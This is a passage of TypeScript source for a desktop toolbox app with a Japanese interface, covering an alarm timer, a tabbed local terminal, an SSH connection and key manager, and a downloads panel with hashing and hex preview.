  setInterval(() => {
    const now = new Date();
    const hms =
      String(now.getHours()).padStart(2, "0") +
      ":" +
      String(now.getMinutes()).padStart(2, "0") +
      ":" +
      String(now.getSeconds()).padStart(2, "0");
    const today = now.toISOString().slice(0, 10);
    for (const a of alarms) {
      if (!a.enabled) continue;
      const at = a.time.length === 5 ? a.time + ":00" : a.time;
      if (at === hms && a.lastFired !== today + " " + at) {
        a.lastFired = today + " " + at;
        alSave();
        tmBeepSound();
        if ("Notification" in window) {
          try {
            if (Notification.permission === "granted")
              new Notification("🔔 アラーム", { body: a.label || a.time });
            else Notification.requestPermission();
          } catch {
            /* ignore */
          }
        }
      }
    }
  }, 1000);
}

// ===== ターミナル =====
interface TermSession {
  id: number;
  shell: string;
  cwd: string;
  output: string;
  history: string[];
  histIdx: number;
  alive: boolean;
}

let termSessions: TermSession[] = [];
let termActive: number | null = null;
let termListenerInstalled = false;

function setupTerminalTool(): void {
  const outN = document.getElementById("tm-output") as HTMLPreElement | null;
  if (!outN) return;
  const out = outN;
  const tabs = document.getElementById("tm-tabs") as HTMLDivElement;
  const shellSel = document.getElementById("tm-shell") as HTMLSelectElement;
  const cwdInput = document.getElementById("tm-cwd") as HTMLInputElement;
  const inputEl = document.getElementById("tm-input") as HTMLInputElement;
  const status = document.getElementById("tm-status") as HTMLSpanElement;
  const ansiStrip = document.getElementById(
    "tm-ansi-strip",
  ) as HTMLInputElement;
  const autoscroll = document.getElementById(
    "tm-autoscroll",
  ) as HTMLInputElement;

  function ansiStripFn(s: string): string {
    // CSI sequences + OSC + bell
    return s
      .replace(/\x1b\[[0-9;?]*[A-Za-z]/g, "")
      .replace(/\x1b\][^\x07]*\x07/g, "")
      .replace(/\x1b\[\?[0-9;]*[hl]/g, "")
      .replace(/\x07/g, "")
      .replace(/\r(?!\n)/g, "");
  }

  function getActive(): TermSession | null {
    if (termActive == null) return null;
    return termSessions.find((s) => s.id === termActive) ?? null;
  }
  function renderTabs(): void {
    tabs.textContent = "";
    for (const s of termSessions) {
      const div = document.createElement("div");
      div.className = "tm-tab" + (s.id === termActive ? " active" : "");
      div.textContent = `${s.shell} #${s.id}`;
      if (!s.alive) div.textContent += " [終了]";
      div.addEventListener("click", () => {
        termActive = s.id;
        renderTabs();
        renderOutput();
      });
      const close = document.createElement("span");
      close.className = "tm-tab-close";
      close.textContent = "✖";
      close.addEventListener("click", (e) => {
        e.stopPropagation();
        if (s.alive)
          invoke("terminal_kill", { sessionId: s.id }).catch(() => undefined);
        termSessions = termSessions.filter((x) => x.id !== s.id);
        if (termActive === s.id) termActive = termSessions[0]?.id ?? null;
        renderTabs();
        renderOutput();
      });
      div.appendChild(close);
      tabs.appendChild(div);
    }
  }
  function renderOutput(): void {
    const s = getActive();
    if (!s) {
      out.textContent = "(セッションなし — 「新しいタブ」で開始)";
      status.textContent = "";
      return;
    }
    out.textContent = ansiStrip.checked ? ansiStripFn(s.output) : s.output;
    if (autoscroll.checked) out.scrollTop = out.scrollHeight;
    status.textContent = `セッション #${s.id} (${s.shell}) ${s.alive ? "稼働中" : "終了済み"}`;
  }

  if (!termListenerInstalled) {
    termListenerInstalled = true;
    listen<{ session_id: number; stream: string; data: string }>(
      "terminal-output",
      (ev) => {
        const sid = ev.payload.session_id;
        const sess = termSessions.find((s) => s.id === sid);
        if (!sess) return;
        sess.output += ev.payload.data;
        // limit buffer
        if (sess.output.length > 500_000)
          sess.output = sess.output.slice(-400_000);
        if (sid === termActive) renderOutput();
      },
    ).catch(() => undefined);
    listen<{ session_id: number; code: number | null }>(
      "terminal-exit",
      (ev) => {
        const sess = termSessions.find((s) => s.id === ev.payload.session_id);
        if (!sess) return;
        sess.alive = false;
        sess.output += `\n[プロセスが終了しました (code=${ev.payload.code ?? "?"})]\n`;
        renderTabs();
        if (sess.id === termActive) renderOutput();
      },
    ).catch(() => undefined);
  }

  async function newSession(): Promise<void> {
    try {
      const shell = shellSel.value;
      const id = await invoke<number>("terminal_spawn", {
        shell,
        cwd: cwdInput.value || null,
      });
      const sess: TermSession = {
        id,
        shell,
        cwd: cwdInput.value,
        output: "",
        history: [],
        histIdx: -1,
        alive: true,
      };
      termSessions.push(sess);
      termActive = id;
      renderTabs();
      renderOutput();
      inputEl.focus();
    } catch (e) {
      alert("起動失敗: " + String(e));
    }
  }

  document.getElementById("tm-new")?.addEventListener("click", () => {
    void newSession();
  });
  document.getElementById("tm-close")?.addEventListener("click", () => {
    const s = getActive();
    if (!s) return;
    if (s.alive)
      invoke("terminal_kill", { sessionId: s.id }).catch(() => undefined);
    termSessions = termSessions.filter((x) => x.id !== s.id);
    termActive = termSessions[0]?.id ?? null;
    renderTabs();
    renderOutput();
  });
  document
    .getElementById("tm-pick-cwd")
    ?.addEventListener("click", async () => {
      try {
        const d = await invoke<string | null>("toolbox_pick_download_dir");
        if (d) cwdInput.value = d;
      } catch {
        /* ignore */
      }
    });

  async function send(data: string): Promise<void> {
    const s = getActive();
    if (!s) {
      alert("先にタブを開いてください");
      return;
    }
    if (!s.alive) {
      alert("このセッションは終了しています");
      return;
    }
    try {
      await invoke("terminal_write", { sessionId: s.id, data });
    } catch (e) {
      status.textContent = "送信失敗: " + String(e);
    }
  }

  document.getElementById("tm-send")?.addEventListener("click", () => {
    const cmd = inputEl.value;
    const s = getActive();
    if (s) {
      s.history.push(cmd);
      s.histIdx = -1;
      s.output += "> " + cmd + "\n";
      renderOutput();
    }
    void send(cmd + "\n");
    inputEl.value = "";
  });
  document.getElementById("tm-sigint")?.addEventListener("click", () => {
    void send("\x03");
  });
  document.getElementById("tm-clear")?.addEventListener("click", () => {
    const s = getActive();
    if (s) {
      s.output = "";
      renderOutput();
    }
  });

  inputEl.addEventListener("keydown", (e) => {
    const s = getActive();
    if (e.key === "Enter") {
      e.preventDefault();
      const cmd = inputEl.value;
      if (s) {
        s.history.push(cmd);
        s.histIdx = -1;
        s.output += "> " + cmd + "\n";
        renderOutput();
      }
      void send(cmd + "\n");
      inputEl.value = "";
    } else if (e.key === "ArrowUp") {
      if (!s || s.history.length === 0) return;
      e.preventDefault();
      if (s.histIdx === -1) s.histIdx = s.history.length - 1;
      else s.histIdx = Math.max(0, s.histIdx - 1);
      inputEl.value = s.history[s.histIdx] ?? "";
    } else if (e.key === "ArrowDown") {
      if (!s || s.history.length === 0) return;
      e.preventDefault();
      if (s.histIdx === -1) return;
      s.histIdx = s.histIdx + 1;
      if (s.histIdx >= s.history.length) {
        s.histIdx = -1;
        inputEl.value = "";
      } else inputEl.value = s.history[s.histIdx] ?? "";
    } else if (e.ctrlKey && e.key.toLowerCase() === "l") {
      e.preventDefault();
      if (s) {
        s.output = "";
        renderOutput();
      }
    } else if (
      e.ctrlKey &&
      e.key.toLowerCase() === "c" &&
      inputEl.selectionStart === inputEl.selectionEnd
    ) {
      e.preventDefault();
      void send("\x03");
    }
  });

  ansiStrip.addEventListener("change", renderOutput);
  renderTabs();
  renderOutput();
}

// ===== 🔐 SSH 接続 =====

interface SshKeyInfo {
  name: string;
  private_path: string;
  public_path: string;
  has_private: boolean;
  has_public: boolean;
  key_type: string;
  comment: string;
  fingerprint: string;
}

interface SshHostEntry {
  alias: string;
  hostname: string;
  user: string;
  port: number;
  identity_file: string;
  extra: string;
}

interface SshSession {
  id: number;
  label: string;
  output: string;
  alive: boolean;
}

let sshSessions: SshSession[] = [];
let sshActive: number | null = null;
let sshListenerInstalled = false;
let sshKeysCache: SshKeyInfo[] = [];

function setupSshTool(): void {
  const out = document.getElementById("ssh-output") as HTMLPreElement | null;
  if (!out) return;
  const tabs = document.getElementById("ssh-tabs") as HTMLDivElement;
  const inputEl = document.getElementById("ssh-input") as HTMLInputElement;
  const status = document.getElementById("ssh-status") as HTMLSpanElement;
  const qTarget = document.getElementById("ssh-q-target") as HTMLInputElement;
  const qPort = document.getElementById("ssh-q-port") as HTMLInputElement;
  const qKey = document.getElementById("ssh-q-key") as HTMLSelectElement;
  const qStrict = document.getElementById("ssh-q-strict") as HTMLInputElement;
  const qVerbose = document.getElementById("ssh-q-verbose") as HTMLInputElement;
  const hostList = document.getElementById("ssh-host-list") as HTMLDivElement;
  const keyList = document.getElementById("ssh-key-list") as HTMLDivElement;
  const hAlias = document.getElementById("ssh-h-alias") as HTMLInputElement;
  const hHost = document.getElementById("ssh-h-host") as HTMLInputElement;
  const hUser = document.getElementById("ssh-h-user") as HTMLInputElement;
  const hPort = document.getElementById("ssh-h-port") as HTMLInputElement;
  const hKey = document.getElementById("ssh-h-key") as HTMLSelectElement;
  const kName = document.getElementById("ssh-k-name") as HTMLInputElement;
  const kType = document.getElementById("ssh-k-type") as HTMLSelectElement;
  const kComment = document.getElementById("ssh-k-comment") as HTMLInputElement;
  const impName = document.getElementById("ssh-imp-name") as HTMLInputElement;
  const impPriv = document.getElementById(
    "ssh-imp-priv",
  ) as HTMLTextAreaElement;
  const impPub = document.getElementById("ssh-imp-pub") as HTMLTextAreaElement;

  function setStatus(msg: string, error = false): void {
    if (!status) return;
    status.textContent = msg;
    status.style.color = error ? "#ff7676" : "";
  }

  function getActive(): SshSession | null {
    if (sshActive == null) return null;
    return sshSessions.find((s) => s.id === sshActive) ?? null;
  }
  function renderTabs(): void {
    tabs.textContent = "";
    for (const s of sshSessions) {
      const div = document.createElement("div");
      div.className = "tm-tab" + (s.id === sshActive ? " active" : "");
      div.textContent = `${s.label} #${s.id}` + (s.alive ? "" : " [終了]");
      div.addEventListener("click", () => {
        sshActive = s.id;
        renderTabs();
        renderOutput();
      });
      const close = document.createElement("span");
      close.className = "tm-tab-close";
      close.textContent = "✖";
      close.addEventListener("click", (e) => {
        e.stopPropagation();
        if (s.alive)
          invoke("terminal_kill", { sessionId: s.id }).catch(() => undefined);
        sshSessions = sshSessions.filter((x) => x.id !== s.id);
        if (sshActive === s.id) sshActive = sshSessions[0]?.id ?? null;
        renderTabs();
        renderOutput();
      });
      div.appendChild(close);
      tabs.appendChild(div);
    }
  }
  function renderOutput(): void {
    const s = getActive();
    if (!s) {
      out!.textContent =
        "(未接続 — 上のクイック接続またはホスト一覧から接続してください)";
      return;
    }
    out!.textContent = s.output;
    out!.scrollTop = out!.scrollHeight;
  }

  if (!sshListenerInstalled) {
    sshListenerInstalled = true;
    listen<{ session_id: number; stream: string; data: string }>(
      "terminal-output",
      (ev) => {
        const sess = sshSessions.find((s) => s.id === ev.payload.session_id);
        if (!sess) return;
        sess.output += ev.payload.data;
        if (sess.output.length > 500_000)
          sess.output = sess.output.slice(-400_000);
        if (sess.id === sshActive) renderOutput();
      },
    ).catch(() => undefined);
    listen<{ session_id: number; code: number | null }>(
      "terminal-exit",
      (ev) => {
        const sess = sshSessions.find((s) => s.id === ev.payload.session_id);
        if (!sess) return;
        sess.alive = false;
        sess.output += `\n[セッション終了 (code=${ev.payload.code ?? "?"})]\n`;
        renderTabs();
        if (sess.id === sshActive) renderOutput();
      },
    ).catch(() => undefined);
  }

  function fillKeySelect(
    sel: HTMLSelectElement,
    allowEmpty: boolean,
    emptyLabel: string,
  ): void {
    const prev = sel.value;
    sel.textContent = "";
    if (allowEmpty) {
      const o = document.createElement("option");
      o.value = "";
      o.textContent = emptyLabel;
      sel.appendChild(o);
    }
    for (const k of sshKeysCache) {
      if (!k.has_private) continue;
      const o = document.createElement("option");
      o.value = k.private_path;
      o.textContent = `${k.name}${k.key_type ? ` (${k.key_type})` : ""}`;
      sel.appendChild(o);
    }
    sel.value = prev;
  }

  async function refreshKeys(): Promise<void> {
    try {
      sshKeysCache = await invoke<SshKeyInfo[]>("ssh_list_keys");
    } catch (e) {
      setStatus(`鍵一覧取得失敗: ${String(e)}`, true);
      sshKeysCache = [];
    }
    fillKeySelect(qKey, true, "(鍵を指定しない)");
    fillKeySelect(hKey, true, "(指定なし)");
    renderKeyList();
  }

  function renderKeyList(): void {
    keyList.textContent = "";
    if (sshKeysCache.length === 0) {
      const div = document.createElement("div");
      div.className = "toolbox-note";
      div.textContent =
        "登録された SSH 鍵はありません。下のフォームから生成 / インポートしてください。";
      keyList.appendChild(div);
      return;
    }
    for (const k of sshKeysCache) {
      const card = document.createElement("div");
      card.style.cssText =
        "border:1px solid #2c2c2c;border-radius:6px;padding:8px 10px;background:#1e1e1e;color:#e0e0e0;display:flex;flex-wrap:wrap;gap:8px;align-items:center";
      const main = document.createElement("div");
      main.style.cssText = "flex:1;min-width:18em";
      main.innerHTML =
        `<div style="font-weight:bold">${escapeHtml(k.name)} ` +
        `<span style="font-weight:normal;color:#9e9e9e;font-size:11px">` +
        `${escapeHtml(k.key_type || "?")}${k.comment ? " · " + escapeHtml(k.comment) : ""}` +
        `</span></div>` +
        (k.fingerprint
          ? `<div style="font-family:monospace;font-size:11px;color:#9e9e9e">${escapeHtml(k.fingerprint)}</div>`
          : "") +
        `<div style="font-size:11px;color:#9e9e9e">priv: ${escapeHtml(k.private_path)}` +
        (k.has_public
          ? ""
          : "  <span style='color:#ff9d3a'>(.pub なし)</span>") +
        `</div>`;
      card.appendChild(main);

      const copyBtn = document.createElement("button");
      copyBtn.type = "button";
      copyBtn.textContent = "📋 公開鍵コピー";
      copyBtn.disabled = !k.has_public;
      copyBtn.addEventListener("click", async () => {
        try {
          const t = await invoke<string>("ssh_read_pubkey", { name: k.name });
          await navigator.clipboard.writeText(t);
          setStatus(`公開鍵をクリップボードにコピーしました: ${k.name}`);
        } catch (e) {
          setStatus(`コピー失敗: ${String(e)}`, true);
        }
      });
      card.appendChild(copyBtn);

      const delBtn = document.createElement("button");
      delBtn.type = "button";
      delBtn.textContent = "🗑 削除";
      delBtn.addEventListener("click", async () => {
        if (!confirm(`鍵 ${k.name} を削除します。よろしいですか？`)) return;
        try {
          await invoke("ssh_delete_key", { name: k.name });
          setStatus(`削除しました: ${k.name}`);
          await refreshKeys();
        } catch (e) {
          setStatus(`削除失敗: ${String(e)}`, true);
        }
      });
      card.appendChild(delBtn);
      keyList.appendChild(card);
    }
  }

  async function refreshHosts(): Promise<void> {
    try {
      const hosts = await invoke<SshHostEntry[]>("ssh_list_hosts");
      renderHostList(hosts);
    } catch (e) {
      setStatus(`ホスト一覧取得失敗: ${String(e)}`, true);
    }
  }

  function renderHostList(hosts: SshHostEntry[]): void {
    hostList.textContent = "";
    if (hosts.length === 0) {
      const div = document.createElement("div");
      div.className = "toolbox-note";
      div.textContent =
        "登録された接続先はありません。下のフォームから追加してください。";
      hostList.appendChild(div);
      return;
    }
    for (const h of hosts) {
      const card = document.createElement("div");
      card.style.cssText =
        "border:1px solid #2c2c2c;border-radius:6px;padding:8px 10px;background:#1e1e1e;color:#e0e0e0;display:flex;flex-wrap:wrap;gap:8px;align-items:center";
      const main = document.createElement("div");
      main.style.cssText = "flex:1;min-width:18em";
      const target =
        (h.user ? h.user + "@" : "") +
        (h.hostname || "?") +
        (h.port && h.port !== 22 ? ":" + h.port : "");
      main.innerHTML =
        `<div style="font-weight:bold">${escapeHtml(h.alias)} ` +
        `<span style="font-weight:normal;color:#9e9e9e;font-size:11px">→ ${escapeHtml(target)}</span></div>` +
        (h.identity_file
          ? `<div style="font-size:11px;color:#9e9e9e">key: ${escapeHtml(h.identity_file)}</div>`
          : "");
      card.appendChild(main);

      const cBtn = document.createElement("button");
      cBtn.type = "button";
      cBtn.className = "toolbox-primary";
      cBtn.textContent = "🚀 接続";
      cBtn.addEventListener("click", () => {
        void connect(h.alias, null, null, false, false);
      });
      card.appendChild(cBtn);

      const eBtn = document.createElement("button");
      eBtn.type = "button";
      eBtn.textContent = "✏ 編集";
      eBtn.addEventListener("click", () => {
        hAlias.value = h.alias;
        hHost.value = h.hostname;
        hUser.value = h.user;
        hPort.value = h.port ? String(h.port) : "";
        hKey.value = h.identity_file || "";
      });
      card.appendChild(eBtn);

      const dBtn = document.createElement("button");
      dBtn.type = "button";
      dBtn.textContent = "🗑";
      dBtn.title = "削除";
      dBtn.addEventListener("click", async () => {
        if (!confirm(`${h.alias} を削除しますか？`)) return;
        try {
          await invoke("ssh_delete_host", { alias: h.alias });
          setStatus(`削除しました: ${h.alias}`);
          await refreshHosts();
        } catch (e) {
          setStatus(`削除失敗: ${String(e)}`, true);
        }
      });
      card.appendChild(dBtn);

      hostList.appendChild(card);
    }
  }

  async function connect(
    target: string,
    portStr: string | null,
    identityPath: string | null,
    strict: boolean,
    verbose: boolean,
  ): Promise<void> {
    const t = target.trim();
    if (!t) {
      setStatus("接続先が空です", true);
      return;
    }
    const args: string[] = [];
    if (portStr) {
      const p = portStr.trim();
      if (p) {
        args.push("-p", p);
      }
    }
    if (identityPath && identityPath.trim()) {
      args.push("-i", identityPath.trim());
      args.push("-o", "IdentitiesOnly=yes");
    }
    if (strict) {
      args.push("-o", "StrictHostKeyChecking=no");
      args.push(
        "-o",
        "UserKnownHostsFile=" +
          ((window as unknown as Record<string, string>).PROCESS_PLATFORM ===
          "win32"
            ? "NUL"
            : "/dev/null"),
      );
    }
    if (verbose) args.push("-v");
    args.push("-tt"); // 強制 tty (better interactive behavior under non-pty)
    args.push(t);
    try {
      const id = await invoke<number>("terminal_spawn_command", {
        program: "ssh",
        args,
        cwd: null,
      });
      const sess: SshSession = {
        id,
        label: t,
        output: `$ ssh ${args.join(" ")}\n`,
        alive: true,
      };
      sshSessions.push(sess);
      sshActive = id;
      renderTabs();
      renderOutput();
      inputEl.focus();
      setStatus(`接続中: ${t}`);
    } catch (e) {
      setStatus(`接続失敗: ${String(e)}`, true);
    }
  }

  async function send(data: string): Promise<void> {
    const s = getActive();
    if (!s || !s.alive) return;
    try {
      await invoke("terminal_write", { sessionId: s.id, data });
    } catch (e) {
      setStatus(`送信失敗: ${String(e)}`, true);
    }
  }

  document.getElementById("ssh-q-connect")?.addEventListener("click", () => {
    void connect(
      qTarget.value,
      qPort.value,
      qKey.value,
      qStrict.checked,
      qVerbose.checked,
    );
  });
  qTarget.addEventListener("keydown", (e) => {
    if (e.key === "Enter") {
      e.preventDefault();
      void connect(
        qTarget.value,
        qPort.value,
        qKey.value,
        qStrict.checked,
        qVerbose.checked,
      );
    }
  });

  document.getElementById("ssh-h-save")?.addEventListener("click", async () => {
    const entry: SshHostEntry = {
      alias: hAlias.value.trim(),
      hostname: hHost.value.trim(),
      user: hUser.value.trim(),
      port: parseInt(hPort.value || "0", 10) || 0,
      identity_file: hKey.value || "",
      extra: "",
    };
    if (!entry.alias) {
      setStatus("alias は必須です", true);
      return;
    }
    try {
      await invoke("ssh_save_host", { entry });
      setStatus(`保存しました: ${entry.alias}`);
      await refreshHosts();
    } catch (e) {
      setStatus(`保存失敗: ${String(e)}`, true);
    }
  });
  document.getElementById("ssh-h-clear")?.addEventListener("click", () => {
    hAlias.value = hHost.value = hUser.value = hPort.value = "";
    hKey.value = "";
  });

  document.getElementById("ssh-k-gen")?.addEventListener("click", async () => {
    const name = kName.value.trim();
    if (!name) {
      setStatus("鍵名は必須です", true);
      return;
    }
    try {
      const k = await invoke<SshKeyInfo>("ssh_generate_key", {
        name,
        keyType: kType.value,
        comment: kComment.value || null,
        overwrite: false,
      });
      setStatus(`鍵生成完了: ${k.name} (${k.key_type})`);
      kName.value = "";
      kComment.value = "";
      await refreshKeys();
    } catch (e) {
      setStatus(`鍵生成失敗: ${String(e)}`, true);
    }
  });

  document
    .getElementById("ssh-imp-save")
    ?.addEventListener("click", async () => {
      const name = impName.value.trim();
      if (!name) {
        setStatus("インポート名を指定してください", true);
        return;
      }
      if (!impPriv.value.trim()) {
        setStatus("秘密鍵テキストを貼り付けてください", true);
        return;
      }
      try {
        const k = await invoke<SshKeyInfo>("ssh_import_key", {
          name,
          privatePem: impPriv.value,
          publicPem: impPub.value || null,
          overwrite: false,
        });
        setStatus(`インポート完了: ${k.name}`);
        impName.value = "";
        impPriv.value = "";
        impPub.value = "";
        await refreshKeys();
      } catch (e) {
        setStatus(`インポート失敗: ${String(e)}`, true);
      }
    });

  document.getElementById("ssh-send")?.addEventListener("click", () => {
    const v = inputEl.value;
    inputEl.value = "";
    void send(v + "\n");
  });
  inputEl.addEventListener("keydown", (e) => {
    if (e.key === "Enter") {
      e.preventDefault();
      const v = inputEl.value;
      inputEl.value = "";
      void send(v + "\n");
    } else if (
      e.ctrlKey &&
      e.key.toLowerCase() === "c" &&
      inputEl.selectionStart === inputEl.selectionEnd
    ) {
      e.preventDefault();
      void send("\x03");
    }
  });
  document.getElementById("ssh-sigint")?.addEventListener("click", () => {
    void send("\x03");
  });
  document.getElementById("ssh-disconnect")?.addEventListener("click", () => {
    const s = getActive();
    if (!s) return;
    if (s.alive)
      invoke("terminal_kill", { sessionId: s.id }).catch(() => undefined);
  });

  // 初期化
  void refreshKeys().then(() => refreshHosts());
  renderTabs();
  renderOutput();
}

// ===== ダウンロード UI =====
interface DownloadItem {
  id: number;
  url: string;
  filename: string;
  path: string;
  bytes: number;
  started_at: number;
  finished_at: number | null;
  status: "in-progress" | "completed" | "failed" | "cancelled";
  mime: string | null;
  sha256: string | null;
  md5: string | null;
  referrer: string | null;
  tab_id: number | null;
  user_agent: string | null;
}

async function setupDownloadsUI(): Promise<void> {
  const btn = document.getElementById(
    "downloads-btn",
  ) as HTMLButtonElement | null;
  const badge = document.getElementById(
    "downloads-badge",
  ) as HTMLSpanElement | null;
  const panel = document.getElementById(
    "downloads-panel",
  ) as HTMLDivElement | null;
  const backdrop = document.getElementById(
    "downloads-backdrop",
  ) as HTMLDivElement | null;
  const closeBtn = document.getElementById("downloads-close");
  const clearBtn = document.getElementById("downloads-clear");
  const openFolderBtn = document.getElementById("downloads-open-folder");
  const engineerToggle = document.getElementById("downloads-engineer-toggle");
  const engineerPanel = document.getElementById(
    "downloads-engineer",
  ) as HTMLDivElement | null;
  const listEl = document.getElementById(
    "downloads-list",
  ) as HTMLUListElement | null;
  const emptyEl = document.getElementById(
    "downloads-empty",
  ) as HTMLDivElement | null;
  const statEl = document.getElementById(
    "downloads-stat",
  ) as HTMLSpanElement | null;
  const verifySel = document.getElementById(
    "dl-eng-verify-target",
  ) as HTMLSelectElement | null;
  const hexView = document.getElementById(
    "downloads-hex-view",
  ) as HTMLDivElement | null;
  const hexBack = document.getElementById("dl-hex-back");
  const hexContent = document.getElementById(
    "dl-hex-content",
  ) as HTMLPreElement | null;
  const hexTitle = document.getElementById("dl-hex-title");
  if (!panel || !listEl) return;

  let items: DownloadItem[] = [];
  const progressMap = new Map<
    number,
    { bytes: number; total: number | null; speed?: number }
  >();
  const speedTracker = new Map<
    number,
    { lastBytes: number; lastTime: number; ema: number }
  >();

  const showHexView = (show: boolean): void => {
    if (!hexView || !listEl || !emptyEl) return;
    hexView.hidden = !show;
    listEl.hidden = show;
    emptyEl.hidden = show || items.length > 0 ? true : emptyEl.hidden;
  };

  const fmtBytes = (n: number): string => {
    if (n < 1024) return `${n} B`;
    if (n < 1024 * 1024) return `${(n / 1024).toFixed(1)} KB`;
    if (n < 1024 * 1024 * 1024) return `${(n / 1024 / 1024).toFixed(2)} MB`;
    return `${(n / 1024 / 1024 / 1024).toFixed(2)} GB`;
  };
  const fmtAgo = (ms: number): string => {
    const d = Date.now() - ms;
    if (d < 60_000) return "今";
    if (d < 3600_000) return `${Math.floor(d / 60_000)}分前`;
    if (d < 86400_000) return `${Math.floor(d / 3600_000)}時間前`;
    return `${Math.floor(d / 86400_000)}日前`;
  };
  const iconFor = (it: DownloadItem): string => {
    const m = it.mime ?? "";
    if (m.startsWith("image/")) return "🖼";
    if (m.startsWith("video/")) return "🎬";
    if (m.startsWith("audio/")) return "🎵";
    if (m.includes("pdf")) return "📕";
    if (
      m.includes("zip") ||
      m.includes("compressed") ||
      m.includes("rar") ||
      m.includes("7z") ||
      m.includes("gzip")
    )
      return "🗜";
    if (m.includes("json") || m.includes("xml") || m.includes("javascript"))
      return "📄";
    if (m.includes("msdownload") || m.includes("elf")) return "⚙";
    if (it.filename.match(/\.(exe|msi|dmg|deb|rpm|appimage)$/i)) return "⚙";
    if (it.filename.match(/\.(zip|tar|gz|7z|rar|xz|bz2)$/i)) return "🗜";
    return "📦";
  };

  const updateBadge = (): void => {
    const inProg = items.filter((i) => i.status === "in-progress").length;
    if (!badge) return;
    if (inProg > 0) {
      badge.hidden = false;
      badge.textContent = String(inProg);
    } else {
      badge.hidden = true;
    }
  };

  // Toolbox 側ミラー要素
  const tbList = document.getElementById(
    "tb-dl-list",
  ) as HTMLUListElement | null;
  const tbEmpty = document.getElementById(
    "tb-dl-empty",
  ) as HTMLDivElement | null;
  const tbStat = document.getElementById(
    "tb-dl-stat",
  ) as HTMLSpanElement | null;
  const tbHexView = document.getElementById(
    "tb-dl-hex-view",
  ) as HTMLDivElement | null;
  const tbHexContent = document.getElementById(
    "tb-dl-hex-content",
  ) as HTMLPreElement | null;
  const tbHexTitle = document.getElementById("tb-dl-hex-title");
  const tbHexBack = document.getElementById("tb-dl-hex-back");
  const tbVerifySel = document.getElementById(
    "tb-dl-verify-target",
  ) as HTMLSelectElement | null;
  const tbVerifyHash = document.getElementById(
    "tb-dl-verify-hash",
  ) as HTMLInputElement | null;
  const tbVerifyGo = document.getElementById("tb-dl-verify-go");
  const tbVerifyResult = document.getElementById("tb-dl-verify-result");
  const tbBulk = document.getElementById(
    "tb-dl-bulk",
  ) as HTMLTextAreaElement | null;
  const tbBulkGo = document.getElementById("tb-dl-bulk-go");
  const tbHeaders = document.getElementById(
    "tb-dl-headers",
  ) as HTMLTextAreaElement | null;
  const tbUa = document.getElementById("tb-dl-ua") as HTMLInputElement | null;
  const tbRef = document.getElementById("tb-dl-ref") as HTMLInputElement | null;

  type HexCtx = {
    view: HTMLDivElement | null;
    content: HTMLPreElement | null;
    title: HTMLElement | null;
  };
  const panelHexCtx: HexCtx = {
    view: hexView,
    content: hexContent,
    title: hexTitle,
  };
  const tbHexCtx: HexCtx = {
    view: tbHexView,
    content: tbHexContent,
    title: tbHexTitle,
  };

  const showHexCtx = (ctx: HexCtx, on: boolean): void => {
    if (ctx.view) ctx.view.hidden = !on;
  };

  const buildItemEl = (it: DownloadItem, hexCtx: HexCtx): HTMLLIElement => {
    const li = document.createElement("li");
    li.className = "dl-item";
    const row = document.createElement("div");
    row.className = "dl-item-row";
    const icon = document.createElement("span");
    icon.className = "dl-icon";
    icon.textContent = iconFor(it);
    const name = document.createElement("span");
    name.className = "dl-name";
    name.textContent = it.filename;
    name.title = it.path;
    name.addEventListener("click", () => {
      if (it.status === "completed") {
        void invoke("downloads_open_file", { id: it.id });
      }
    });
    row.appendChild(icon);
    row.appendChild(name);
    li.appendChild(row);

    const meta = document.createElement("div");
    meta.className = "dl-meta";
    const status = document.createElement("span");
    status.className = `dl-status-${it.status}`;
    const statusText: Record<string, string> = {
      "in-progress": "⏳ ダウンロード中",
      completed: "✓ 完了",
      failed: "✗ 失敗",
      cancelled: "⊘ 中断",
    };
    status.textContent = statusText[it.status] ?? it.status;
    meta.appendChild(status);
    const prog = progressMap.get(it.id);
    const bytesNow = prog?.bytes ?? it.bytes;
    const totalHint = prog?.total ?? null;
    const sizeSpan = document.createElement("span");
    if (it.status === "in-progress" && totalHint) {
      sizeSpan.textContent = `${fmtBytes(bytesNow)} / ${fmtBytes(totalHint)}`;
    } else if (bytesNow > 0) {
      sizeSpan.textContent = fmtBytes(bytesNow);
    }
    meta.appendChild(sizeSpan);
    if (it.status === "in-progress") {
      const tracker = speedTracker.get(it.id);
      if (tracker && tracker.ema > 0) {
        const sp = document.createElement("span");
        sp.className = "dl-speed";
        sp.textContent = `${fmtBytes(tracker.ema)}/s`;
        meta.appendChild(sp);
        if (totalHint && tracker.ema > 0) {
          const remain = (totalHint - bytesNow) / tracker.ema;
          const eta = document.createElement("span");
          eta.textContent =
            remain < 60
              ? `残り${Math.ceil(remain)}秒`
              : `残り${Math.ceil(remain / 60)}分`;
          meta.appendChild(eta);
        }
      }
    }
    const time = document.createElement("span");
    time.textContent = fmtAgo(it.started_at);
    meta.appendChild(time);
    if (it.mime) {
      const m = document.createElement("span");
      m.textContent = it.mime;
      meta.appendChild(m);
    }
    li.appendChild(meta);

    if (it.status === "in-progress") {
      const bar = document.createElement("div");
      bar.className = "dl-progress";
      const fill = document.createElement("div");
      if (totalHint && totalHint > 0) {
        fill.className = "dl-progress-fill";
        fill.style.width = `${Math.min(100, (bytesNow / totalHint) * 100)}%`;
      } else {
        fill.className = "dl-progress-fill indeterminate";
      }
      bar.appendChild(fill);
      li.appendChild(bar);
    }

    if (it.sha256) {
      const h = document.createElement("div");
      h.className = "dl-hash";
      h.textContent = `SHA-256: ${it.sha256}`;
      li.appendChild(h);
    }
    if (it.md5) {
      const h = document.createElement("div");
      h.className = "dl-hash";
      h.textContent = `MD5: ${it.md5}`;
      li.appendChild(h);
    }

    const actions = document.createElement("div");
    actions.className = "dl-actions";
    const mkBtn = (
      label: string,
      title: string,
      fn: () => void,
    ): HTMLButtonElement => {
      const b = document.createElement("button");
      b.type = "button";
      b.textContent = label;
      b.title = title;
      b.addEventListener("click", fn);
      return b;
    };
    if (it.status === "completed") {
      actions.appendChild(
        mkBtn("📂 開く", "ファイルを開く", () => {
          void invoke("downloads_open_file", { id: it.id });
        }),
      );
      actions.appendChild(
        mkBtn("📁 場所", "フォルダで表示", () => {
          void invoke("downloads_show_in_folder", { id: it.id });
        }),
      );
      actions.appendChild(
        mkBtn("# ハッシュ", "SHA-256 / MD5 を計算", async () => {
          try {
            const r = await invoke<{
              sha256: string;
              md5: string;
              bytes: number;
            }>("downloads_compute_hash", { id: it.id });
            it.sha256 = r.sha256;
            it.md5 = r.md5;
            render();
          } catch (e) {
            alert(`ハッシュ計算失敗: ${e}`);
          }
        }),
      );
      actions.appendChild(
        mkBtn("🔍 HEX", "先頭 512 バイトを表示", async () => {
          try {
            const r = await invoke<{
              hex: string;
